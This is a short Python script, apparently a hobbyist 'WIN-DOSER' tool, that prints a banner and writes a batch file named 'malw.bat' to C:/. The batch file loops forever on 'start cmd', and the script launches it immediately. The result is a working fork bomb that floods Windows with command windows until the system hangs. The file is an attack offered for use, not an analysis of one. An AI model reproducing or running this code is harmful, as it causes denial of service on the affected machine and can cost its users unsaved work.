#Author: OverWhite
#lang: python3

import os

print("""
 _       _______   __      ____  ____  _____ __________ 
| |     / /  _/ | / /     / __ \/ __ \/ ___// ____/ __ \
| | /| / // //  |/ /_____/ / / / / / /\__ \/ __/ / /_/ /
| |/ |/ // // /|  /_____/ /_/ / /_/ /___/ / /___/ _, _/ 
|__/|__/___/_/ |_/     /_____/\____//____/_____/_/ |_|  """)

os.chdir("C:/")
malware = open("malw.bat", "w")
malware.write("""@echo off
CLS
:A
start cmd
goto A""")
os.system("start malw.bat")